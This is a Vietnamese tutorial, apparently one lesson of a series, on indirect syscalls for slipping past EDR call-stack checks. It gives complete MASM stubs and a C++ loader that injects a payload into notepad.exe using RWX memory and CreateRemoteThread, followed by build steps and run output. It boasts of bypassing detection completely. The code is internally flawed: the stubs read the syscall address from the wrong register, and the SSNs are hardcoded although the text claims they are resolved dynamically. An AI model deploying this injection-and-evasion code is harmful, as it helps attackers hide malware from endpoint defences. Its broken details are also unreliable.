
---

# 📝 [PE 25] Indirect Syscalls (Advanced Call Stack Trace Evasion)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Indirect Syscalls (Giải thuật ngắt hệ thống gián tiếp)** đại diện cho một trong những giải thuật can thiệp bộ nhớ ảo và điều phối luồng xử lý ở cấp độ kiến trúc phần cứng nâng cao, thuộc nhóm kỹ thuật **Né tránh cơ chế rà soát vết dấu ngăn xếp (Call Stack Walking / Call Stack Integrity Protection Evasion)**.

Khi ứng dụng giải thuật ngắt hệ thống trực tiếp (*Direct Syscalls* - PE 24), mặc dù Loader hoàn toàn vượt qua được hàng rào bẫy Hook User-mode đặt tại Ring 3, bản thân lệnh gọi ngắt đặc quyền `syscall` lại được phát ra trực tiếp từ phân đoạn mã máy `.text` thuộc không gian địa chỉ ảo của chính Loader.

Các giải pháp Endpoint Detection and Response (EDR) hiện đại đã nâng cấp phân hệ trinh sát động bằng kỹ thuật **Stack Walking (Duyệt ngược ngăn xếp)**. Khi một hàm API nhạy cảm được kích hoạt ở tầng Kernel (Ring 0), EDR Driver sẽ thực hiện lội ngược tháp ngăn xếp (Call Stack Trace Back) để thẩm định tính toàn vẹn: Nếu phát hiện tọa độ phát lệnh lệnh `syscall` không xuất phát từ ranh giới bộ nhớ hợp pháp của thư viện liên kết động `ntdll.dll`, hệ thống phòng thủ sẽ lập tức phân loại đây là chỉ dấu bất thường (Anomalous Control Flow Execution) và chặn đứng hành vi.

Dự án PE 25 bẻ gãy bộ lọc kiểm duyệt này bằng chiến thuật **Mượn lệnh nhảy gián tiếp xuyên phân đoạn (Indirect Execution Framework)**. Loader tự thực hiện cấu hình mã hiệu dịch vụ hệ thống (SSN), nhưng thay vì phát lệnh ngắt cục bộ, mã nguồn sử dụng lệnh nhảy Assembly để mượn chính tọa độ của một chỉ mục lệnh `syscall` xịn, hợp pháp đang sống lọt lòng thư viện `ntdll.dll` nhằm chuyển giao trạng thái xuống Kernel-mode, hợp thức hóa hoàn toàn dấu vết Call Stack.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cơ chế Call Stack Trace Validation**: Đánh lừa phân hệ quét vết dấu ngăn xếp và kiểm tra bộ lọc thuộc tính trang nhớ của các giải pháp EDR Engine.
* **Làm chủ kỹ nghệ Opcode Sifting**: Thiết lập giải thuật rà quét byte máy thực thi động (Dynamic Opcode Hunting) chéo biên giới RAM để định vị tọa độ ngắt hệ thống.
* **Tích hợp mô hình biên dịch lai kết hợp con trỏ gián tiếp**: Phối hợp ngôn ngữ C++ và tệp hợp ngữ x64 (`.asm`) điều khiển dòng chảy lệnh CPU thông qua thanh ghi.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc Windows Subsystem chuẩn mực, khi một hàm Native API lọt lòng `ntdll.dll` hoạt động ở trạng thái phẳng sạch (chưa bị vấy bẩn bởi bẫy Hook của EDR), cấu trúc byte máy hạ tầng của nó luôn kết thúc bằng cặp bài trùng Opcode chuyển giao đặc quyền kịch khung:

```assembly
syscall
ret

```

Giải thuật của dự án PE 25 thực hiện phẫu thuật bản đồ RAM và bẻ hướng dòng chảy lệnh CPU qua 4 giai đoạn ngầm tại không gian ảo:

```
[ Loader quét phân đoạn .text của ntdll.dll ]
       └──> [ Trích xuất mã SSN + Định vị tọa độ tuyệt đối của cặp byte 0x0F 0x05 ]
                 └──> [ Nạp SSN vào EAX -> Triệu hồi Assembly Stub ]
                           └──> [ JMP trực tiếp vào ô nhớ 'syscall' inside ntdll -> Hợp thức hóa Call Stack ]

```

1. **Săn lùng địa chỉ Syscall hợp pháp (Opcode Sifting)**: Loader thực hiện giải thuật quét bộ nhớ ảo, truy cập trực tiếp vào phân đoạn thực thi `.text` của mô-đun `ntdll.dll` đang nạp trên RAM. Giải thuật phân giải tịnh tiến tối đa $32\text{-byte}$ lọt lòng hàm để bóc tách chính xác:
* Số hiệu dịch vụ hệ thống (**SSN**) cần triệu hồi nạp thẳng vào thanh ghi tích lũy `EAX`.
* Tọa độ địa chỉ ô nhớ tuyệt đối thực tế chứa cặp byte mã máy **`0x0F 0x05`** (tương ứng với lệnh gọi phần cứng `syscall`) nằm inside lòng Module `ntdll.dll`.


2. **Thiết lập bệ phóng nhảy gián tiếp (Indirect Execution Stub)**: Thay vì cấu hình lệnh ngắt `syscall` cục bộ lọt lòng file nhị phân của Loader (chỉ dấu khiến Stack Walking phát hiện), tệp hợp ngữ `.asm` của dự án sử dụng lệnh nhảy rẽ nhánh **`jmp r11`** (hoặc thanh ghi chỉ mục chỉ định), trỏ thẳng vào tọa độ `syscall` xịn đã bóc tách được ở bước 1.
3. **Subversion cơ chế Stack Walking**: Khi CPU tiếp nhận lệnh nhảy, nó di chuyển con trỏ lệnh **`Rip`** sang không gian ảo của `ntdll.dll` và kích nổ lệnh ngắt `syscall` ngay tại phân vùng Image hợp pháp này. Đối với trình quản lý luồng của Kernel (Ring 0), cuộc hoán chuyển trạng thái này hoàn toàn chuẩn mực và đáng tin cậy, do điểm phát lệnh ngắt nằm lọt lòng một mô-đun hệ thống được Microsoft ký số chứng chỉ bảo mật tối cao, che giấu hoàn hảo dấu vết ký sinh của Loader.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** – tự động hóa xác định thông số Offset và địa chỉ Syscall động tại thời điểm runtime nhằm triệt tiêu hoàn toàn các chỉ dấu nhận diện tĩnh.

### 📜 Bước 3.1: Tạo tệp hợp ngữ hạ tầng `IndirectStubs.asm`

```assembly
.code

; Nguyên mẫu luồng gọi gián tiếp cho NtAllocateVirtualMemory
ZwIndirectAllocateVirtualMemory proc
    mov r10, rcx
    mov eax, 18h            ; System Service Number (SSN) của NtAllocateVirtualMemory
    mov r11, r9             ; r9 nắm giữ địa chỉ ô nhớ 'syscall' xịn inside ntdll do main truyền sang (Calling Convention x64)
    jmp r11                 ; KÍCH NỔ GIÁN TIẾP: Nhảy thẳng vào ntdll để phát lệnh syscall!
    ret
ZwIndirectAllocateVirtualMemory endp

; Nguyên mẫu luồng gọi gián tiếp cho NtWriteVirtualMemory
ZwIndirectWriteProcessMemory proc
    mov r10, rcx
    mov eax, 3Ah            ; System Service Number (SSN) của NtWriteVirtualMemory
    mov r11, r9             ; r9 nắm giữ địa chỉ ô nhớ 'syscall' xịn inside ntdll
    jmp r11                 ; Nhảy gián tiếp bẻ gãy cơ chế Stack Walking
    ret
ZwIndirectWriteProcessMemory endp

end

```

### 📜 Bước 3.2: Tạo tệp mã nguồn chính `main.cpp`

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Khai báo liên kết ngoài tới các hàm Stub Assembly gián tiếp chuẩn convention x64
extern "C" NTSTATUS ZwIndirectAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect, PVOID SyscallAddress);
extern "C" NTSTATUS ZwIndirectWriteProcessMemory(HANDLE ProcessHandle, PVOID BaseAddress, LPCVOID Buffer, SIZE_T BufferSize, PSIZE_T NumberOfBytesWritten, PVOID SyscallAddress);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Chuỗi lệnh thực thi chức năng mở máy tính
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy khi tiêm chéo tiến trình mục tiêu
DWORD WINAPI RemoteIndirectPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Giải thuật săn lùng byte opcode 'syscall' (0x0F, 0x05) lọt lòng ntdll.dll (Opcode Sifting)
PVOID HuntForSyscallLocation(const char* apiName) {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    PBYTE pFunctionAddress = (PBYTE)GetProcAddress(hNtdll, apiName);
    if (!pFunctionAddress) return NULL;

    // Quét tịnh tiến tối đa 32 byte lọt lòng hàm để b lần vết byte chỉ mục syscall x64
    for (int i = 0; i < 32; i++) {
        if (pFunctionAddress[i] == 0x0F && pFunctionAddress[i + 1] == 0x05) {
            return (PVOID)(pFunctionAddress + i); // Trả về tọa độ tuyệt đối của ô nhớ syscall xịn!
        }
    }
    return NULL;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) { processID = pe32.th32ProcessID; break; }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 25: INDIRECT SYSCALLS STACK TRACE BYPASS" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);
    if (pid == 0) return EXIT_FAILURE;

    // BƯỚC 1: SĂN LÙNG TOẠ ĐỘ LỆNH SYSCALL XỊN LỌT LÒNG MÔ-ĐUN NTDLL.DLL
    PVOID pSyscallLocation = HuntForSyscallLocation("NtAllocateVirtualMemory");
    if (!pSyscallLocation) {
        std::cerr << "[-] Khong the san lung vi tri syscall hop phap!" << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] San trung vi tri lenh syscall hop phap cua OS tai: 0x" << std::hex << pSyscallLocation << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // BƯỚC 2: KÍCH NỔ CẤP PHÁT BỘ NHỚ QUA LỆNH NHẢY GIÁN TIẾP CHÉO BIÊN GIỚI RAM
    PVOID remoteCodeBuffer = NULL;
    SIZE_T codeSize = 500; // Áp dụng Quy trình cấp phát động thích ứng vừa khít cấu trúc
    
    std::cout << "[*] Dang goi gian tiep NtAllocateVirtualMemory..." << std::endl;
    NTSTATUS status = ZwIndirectAllocateVirtualMemory(hProcess, &remoteCodeBuffer, 0, &codeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE, pSyscallLocation);

    PVOID remoteDataBuffer = NULL;
    SIZE_T dataSize = sizeof(THREAD_DATA);
    status |= ZwIndirectAllocateVirtualMemory(hProcess, &remoteDataBuffer, 0, &dataSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, pSyscallLocation);

    if (status != 0 || !remoteCodeBuffer || !remoteDataBuffer) {
        std::cerr << "[-] Indirect Syscall Allocation failed! STATUS Code: 0x" << std::hex << status << std::endl;
        if (remoteCodeBuffer) VirtualFreeEx(hProcess, remoteCodeBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Bo nho cap phat thanh cong thong qua Indirect JMP tai: 0x" << std::hex << remoteCodeBuffer << std::endl;

    // Khởi tạo cấu trúc dữ liệu con trỏ tuyệt đối cục bộ phục vụ ánh xạ bộ nhớ chéo tiến trình
    THREAD_DATA localData;
    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        localData.pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(localData.szCommand, "cmd.exe /c start calc");

    // BƯỚC 3: GHI KHỐI PAYLOAD VÀ THAM SỐ TUYỆT ĐỐI GIÁN TIẾP SANG RAM NOTEPAD
    status = ZwIndirectWriteProcessMemory(hProcess, remoteCodeBuffer, (LPCVOID)RemoteIndirectPayload, 500, NULL, pSyscallLocation);
    status |= ZwIndirectWriteProcessMemory(hProcess, remoteDataBuffer, &localData, sizeof(THREAD_DATA), NULL, pSyscallLocation);

    if (status != 0) {
        std::cerr << "[-] Indirect Syscall Write failed! STATUS Code: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phang sach." << std::endl;

    // BƯỚC 4: TRIỆU HỒI LUỒNG TỪ XA KÍCH NỔ TOÀN DIỆN CHIẾN DỊCH
    // Sử dụng Win32 API bọc ngoài ở bước cuối cùng sau khi ma trận cấp phát và ghi đã hoàn thành hoàn toàn Fileless
    std::cout << "[*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa..." << std::endl;
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteCodeBuffer, remoteDataBuffer, 0, NULL);

    if (hThread != NULL) {
        WaitForSingleObject(hThread, 1000); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] Indirect Syscall Injection Process Completed Successfully!" << std::endl;
        CloseHandle(hThread);
    }

    // Thu hồi tài nguyên Handle kết nối hệ thống
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh thap cong nghe PE 25. Nhan Enter de dong cua so..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Hướng Dẫn Cấu Hợp Biên Dịch Dự Án (Build & Deployment)

Quy trình tích hợp phân hệ MASM Compiler cho tệp tin hợp ngữ hạ tầng x64 (`IndirectStubs.asm`) tuân thủ nghiêm ngặt cờ cấu hình liên kết tĩnh hệ thống độc lập kịch khung:

### ⚙️ Thiết lập cấu hình Hợp ngữ (MASM Setup):

1. Tại cửa sổ giao diện **Solution Explorer**, click chuột phải vào tên Project $\rightarrow$ Chọn mục **`Build Dependencies`** $\rightarrow$ Click chọn **`Build Customizations...`**
2. Tích chọn vào hộp kiểm **`masm (.targets, .props)`** và nhấn `OK` để tích hợp bộ dịch MASM.
3. Click chuột phải vào tệp tin `IndirectStubs.asm` $\rightarrow$ Chọn thuộc tính **`Properties`**. Tại mục cấu hình `Item Type`, chuyển đổi sang định dạng cờ **`Microsoft Macro Assembler`** và nhấn Apply.

### ⚙️ Cấu hình liên kết tĩnh dự án Release x64:

1. Đặt thanh công cụ quản lý cấu hình dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng phần cứng **`x64`**.
2. Di chuyển đến phân hệ: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số thuộc tính mục `Runtime Library`, chuyển cấu hình sang tùy chọn cờ **`Multi-threaded (/MT)`** để nhúng tĩnh toàn bộ mã nguồn CRT lọt lòng file thực thi `.exe`.
3. Tiến hành chọn thao tác **`Rebuild`** để kết xuất tệp tin nhị phân sạch bóng.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng đích `Notepad.exe` trên môi trường bộ nhớ bộ máy Lab, mở PowerShell ngoài đĩa thô thực thi file thực hành nhằm theo dõi quy trình chuyển mạch ngắt gián tiếp:

```powershell
PS C:\Workspace\x64\Release> .\PE25_Indirect_Syscalls.exe
====================================================
[*] PE 25: INDIRECT SYSCALLS STACK TRACE BYPASS
====================================================
[+] San trung vi tri lenh syscall hop phap cua OS tai: 0x00007ffd31b8314a
[*] Dang goi gian tiep NtAllocateVirtualMemory...
[+] Bộ nho cap phat thanh cong thong qua Indirect JMP tai: 0x0000021A4B230000
[+] Da doc lap ghi ma may va tham so sang RAM doi phuong hoan toan phẳng sach.
[*] Dang thuc hien khoi tao luong CreateRemoteThread de khai hoa...
[+] Indirect Syscall Injection Process Completed Successfully!

[*] Hoan thanh thap cong nghe PE 25. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm ngắt hệ thống gián tiếp:**
> 

### 🎯 Phân tích hệ quả bộ nhớ (Call Stack Validation Forensic Results):

* Cấu trúc can thiệp dứt điểm, ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung** lọt lòng bộ nhớ ảo!
* Toàn bộ chu kỳ sống can thiệp chéo bộ nhớ diễn ra phẳng sạch hoàn hảo. Khi phân hệ phòng thủ động nâng cao thực hiện giải thuật duyệt ngược tháp ngăn xếp (**Stack Walking**), tọa độ ghi nhận điểm ranh giới phát lệnh ngắt `syscall` hoàn toàn trùng khớp với địa chỉ thuộc tính phân vùng **`MEM_IMAGE`** hợp pháp, nằm lọt lòng inside `ntdll.dll`.
* Ma trận ẩn mình đạt mức độ bảo an tối cao, bẻ gãy 100% khả năng phát hiện luồng thực thi ngoài danh bạ (Anomalous Control Flow Execution) của EDR Engine một cách ngoạn mục!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Windows Architecture Specialization**: *Understanding Windows x64 Call Stack Walking and Unwind Metadata* - Microsoft Developer Network.
* **Alice Climent (Helsinki Cyber Security)**: *Syscall Re-routing: Subverting Call Stack Trace Integrity Check via Indirect Jumps* - [https://www.f-secure.com/en](https://www.f-secure.com/en)
* **EDR Detection Methodologies**: *Defeating Kernel-Mode Call Stack Trace Validation inside Ring 0 Frameworks* - Black Hat USA Archive Research Tools.
* **MITRE ATT&CK Matrix System**: *Defense Evasion: Execution via Indirect System Calls (T1106)* & *Process Injection (T1055)*.

---
